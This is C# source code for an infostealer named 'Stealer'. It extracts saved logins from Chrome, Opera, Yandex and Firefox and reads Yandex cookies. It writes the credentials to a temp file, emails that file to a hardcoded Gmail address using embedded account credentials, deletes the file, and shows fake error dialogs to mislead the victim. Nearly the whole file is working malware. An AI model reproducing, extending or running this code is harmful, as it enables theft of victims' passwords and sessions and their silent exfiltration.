using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Stealer
{
    public class CredentialModel
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }

    public class Program
    {
        public static List<BrowserInfo> Browsers = BrowserSearcher.DetectBrowsers();

        public static List<string> Attachments { get; set; } = new List<string>();

        private static Assembly OnResolveAssembly(object sender, ResolveEventArgs args)
        {
            try
            {
                Assembly parentAssembly = Assembly.GetExecutingAssembly();
                string finalname = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
                string[] ResourcesList = parentAssembly.GetManifestResourceNames();
                string OurResourceName = null;
                for (int i = 0; i < ResourcesList.Count(); i++)
                {
                    string name = ResourcesList[i];
                    if (name.EndsWith(finalname))
                    {
                        OurResourceName = name;
                        break;
                    }
                }

                if (!string.IsNullOrWhiteSpace(OurResourceName))
                {
                    using (Stream stream = parentAssembly.GetManifestResourceStream(OurResourceName))
                    {
                        byte[] block = new byte[stream.Length];
                        stream.Read(block, 0, block.Length);
                        return Assembly.Load(block);
                    }
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
        }

        private static void AddLibraries()
        {
            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SQLite.Interop.dll")))
            {
                FileStream f = File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SQLite.Interop.dll"));
                Assembly.GetExecutingAssembly().GetManifestResourceStream("Stealer.x64.SQLite.Interop.dll").CopyTo(f);
                f.Close();
            }
            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86), "SQLite.Interop.dll")))
            {
                FileStream f = File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86), "SQLite.Interop.dll"));
                Assembly.GetExecutingAssembly().GetManifestResourceStream("Stealer.x86.SQLite.Interop.dll").CopyTo(f);
                f.Close();
            }
        }

        private static void SendMail(string SenderEmail, string SenderPassword, string DestinationEmail, string Message)
        {
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailAddress from = new MailAddress(SenderEmail, "Stealer");
            MailAddress to = new MailAddress(DestinationEmail);
            MailMessage message = new MailMessage(from, to)
            {
                Subject = "Stealer",
                Body = Message
            };
            foreach(var c in Attachments)
            {
                message.Attachments.Add(new Attachment(c));
            }
            client.Credentials = new NetworkCredential(SenderEmail, SenderPassword);
            client.EnableSsl = true;
            client.Send(message);
            message.Dispose();
            client.Dispose();
        }
        
        private static IEnumerable<CredentialModel> GetPasses(List<BrowserInfo> browsers)
        {
            List<CredentialModel> result = new List<CredentialModel>();
            try
            {
                if (browsers.Any(c => c.Type == BrowserType.Chrome || c.Type == BrowserType.Opera || c.Type == BrowserType.Yandex))
                {
                    result.AddRange(DPAPIBrowser.ReadDPAPIPasses(browsers.Where(c => c.Type == BrowserType.Chrome || c.Type == BrowserType.Opera || c.Type == BrowserType.Yandex).Select(c => c.PathToUserData).ToArray()));
                }

                if (browsers.Any(c => c.Type == BrowserType.Mozilla))
                {
                    result.AddRange(FirefoxPassReader.ReadPasswords(Directory.GetDirectories(browsers.Where(c => c.Type == BrowserType.Mozilla).Select(c => c.PathToUserData).ToArray()[0])));
                }
            }
            catch { }
            return result;
        }

        private static string BoxPasswords(IEnumerable<CredentialModel> passes)
        {
            StringBuilder builder = new StringBuilder();
            string delimeter = $"---------------------------------{Environment.NewLine}";
            foreach (CredentialModel c in passes)
            {
                builder.Append(delimeter);
                builder.Append($"Url - {c.Url}{Environment.NewLine}");
                builder.Append($"Login - {c.Username}{Environment.NewLine}");
                builder.Append($"Password - {c.Password}{Environment.NewLine}");
                builder.Append(delimeter);
            }
            return builder.ToString();
        }

        private static bool IsInternetActive()
        {
            try
            {
                return new Ping().Send("google.com", 1000).Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        public static int CLRMain(string p)
        {
            Main();
            return 0;
        }

        public static void Main()
        {
            var p = Path.GetTempPath();
            if (IsInternetActive())
            {
                try
                {
                    AddLibraries();
                }
                catch
                {
                    MessageBox.Show("0xc000007b", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                AppDomain.CurrentDomain.AssemblyResolve += OnResolveAssembly;
                DPAPIBrowser.ReadDPAPICookies(new string[] { @"C:\Users\KOLA\AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies" });
                var f = File.CreateText(Path.GetTempPath() + @"\Passes.txt");
                f.Write(BoxPasswords(GetPasses(Browsers)));
                f.Close();
                Attachments.Add(Path.GetTempPath() + @"\Passes.txt");
                SendMail("testovtest186@gmail.com", "TestTestov", "anonimkonstantin3@gmail.com", "");
                foreach(var c in Attachments)
                {
                    if (File.Exists(c))
                        File.Delete(c);
                }
                MessageBox.Show("Connection error", "Error occurred while sending a request", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Application required internet connection", "Network error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
            }
        }
    }
}
